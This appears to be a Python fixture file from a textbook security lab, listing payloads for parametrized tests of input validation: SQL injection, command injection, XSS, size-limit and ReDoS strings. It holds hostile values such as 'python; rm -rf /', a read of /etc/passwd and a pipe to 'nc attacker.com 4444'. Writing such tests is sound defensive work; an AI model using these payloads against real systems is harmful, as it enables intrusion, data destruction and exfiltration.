# code/reference/tests/fixtures/payloads.py
# Chapter 8, Lab 8.2: Security Test Payload Library
#
# Reusable attack payloads for parametrized security tests.
# Use only against synthetic test data in isolated environments.

# ---------------------------------------------------------------------------
# SQL Injection payloads — for sort/filter/search fields
# ---------------------------------------------------------------------------
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE submissions; --",
    "1 UNION SELECT username, password, null FROM users --",
    "1 AND (SELECT COUNT(*) FROM users) > 0",
    "CASE WHEN 1=1 THEN score ELSE 0 END",   # blind SQLi via ORDER BY
    "admin'--",
    "' OR 1=1--",
]

# ---------------------------------------------------------------------------
# Command injection payloads — for language / filename fields
# ---------------------------------------------------------------------------
COMMAND_INJECTION_PAYLOADS = [
    "python; rm -rf /",
    "python && cat /etc/passwd",
    "python | nc attacker.com 4444",
    "`whoami`",
    "$(id)",
    "../../../etc/passwd",
    "python\x00exploit",
]

# ---------------------------------------------------------------------------
# XSS payloads — for title / description / source_code fields
# ---------------------------------------------------------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\";alert(String.fromCharCode(88,83,83))//",
]

# ---------------------------------------------------------------------------
# Size boundary payloads — for source_code (64KB limit)
# ---------------------------------------------------------------------------
SIZE_BOUNDARY_PAYLOADS = {
    "exactly_at_limit": "x" * 64_000,    # should be accepted
    "one_byte_over":    "x" * 64_001,    # should be rejected (422)
    "far_over_limit":   "x" * 1_000_000, # should be rejected (422)
    "empty":            "",              # should be rejected (422)
    "minimum_valid":    "print(1)",      # should be accepted
}

# ---------------------------------------------------------------------------
# ReDoS trigger strings — for regex-heavy validators
# ---------------------------------------------------------------------------
REDOS_PAYLOADS = [
    "a" * 50 + "X",    # catastrophic backtracking on (a+)+
    "a" * 100 + "!",
    "(" * 20 + ")" * 20,
]
